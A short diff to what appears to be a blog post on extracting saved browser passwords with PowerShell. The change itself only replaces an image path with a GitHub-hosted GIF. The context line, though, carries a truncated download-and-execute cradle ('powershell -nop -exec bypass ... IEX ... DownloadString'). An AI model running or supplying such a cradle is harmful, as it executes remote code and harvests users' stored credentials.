@@ -16,7 +16,7 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 ##### Execution:
 
 <figure>
-<img src="/extract-saved-browser-passwords-using-powershell/credgrap.gif" alt="Powershell code">
+<img src="https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/extract-saved-browser-passwords-using-powershell/credgrap.gif" alt="Powershell code">
 <figcaption>Powershell command</figcaption>
 </figure>
 
